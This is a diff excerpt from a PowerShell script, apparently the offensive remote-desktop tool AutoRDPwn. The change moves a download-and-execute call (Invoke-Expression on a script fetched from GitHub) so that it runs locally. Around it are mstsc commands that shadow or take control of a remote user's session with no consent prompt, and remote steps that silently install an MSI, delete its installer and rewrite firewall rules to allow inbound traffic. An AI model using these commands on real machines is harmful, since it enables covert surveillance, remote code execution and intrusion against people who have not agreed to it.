@@ -521,8 +521,9 @@ function Remove-Exclusions {
 	if($control -eq 'true') { if($stickykeys){ mstsc /v $computer /admin /f } elseif (!$user){ mstsc /v $computer /restrictedadmin /shadow:$shadow /control /noconsentprompt /f } else { mstsc /v $computer /admin /shadow:$shadow /control /noconsentprompt /prompt /f }}
         if($control -eq 'false') { if(!$user){ mstsc /v $computer /restrictedadmin /shadow:$shadow /noconsentprompt /f } else { mstsc /v $computer /admin /shadow:$shadow /noconsentprompt /prompt /f }}}}}
 
-        else { Write-Host "$version $txt37" -ForegroundColor Red ; if(!$vncserver){ invoke-command -session $RDP[0] -scriptblock {
-        Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-RDPwrap.ps1')
+        else { Write-Host "$version $txt37" -ForegroundColor Red ; if(!$vncserver){ 
+	Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-RDPwrap.ps1')
+        invoke-command -session $RDP[0] -scriptblock { Set-Content -Path Setup.msi -Value $using:RDPWrap -Encoding Byte 
         msiexec /i "Setup.msi" /quiet /qn /norestart ; netsh advfirewall firewall delete rule name="$using:Pwn6" 2>&1> $null ; del .\Setup.msi
         netsh advfirewall firewall add rule name="$using:Pwn6" dir=in protocol=udp action=allow program="C:\Windows\System32\rdpsa.exe" enable=yes 2>&1> $null
         netsh advfirewall firewall add rule name="$using:Pwn6" dir=in protocol=tcp action=allow program="C:\Windows\System32\rdpsa.exe" enable=yes 2>&1> $null
